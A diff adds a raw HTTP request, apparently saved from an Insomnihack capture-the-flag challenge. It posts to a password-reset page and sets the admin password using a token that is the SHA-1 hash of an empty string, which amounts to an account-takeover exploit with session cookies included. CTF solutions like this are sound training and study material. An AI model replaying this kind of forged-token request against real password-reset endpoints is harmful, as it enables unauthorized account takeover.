@@ -1,0 +1,16 @@
+POST /passwordreset.php HTTP/1.1
+Host: repository.insomnihack.ch
+Content-Length: 113
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://repository.insomnihack.ch
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://repository.insomnihack.ch/passwordreset.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=7vmvp4jkchoqpattnufdbn7rre; APPSESSID=82cb317e94f5469f0815e48de213bef0
+Connection: close
+
+username=admin&token=da39a3ee5e6b4b0d3255bfef95601890afd80709&password=Taidh1234%21&password2=Taidh1234%21&reset=
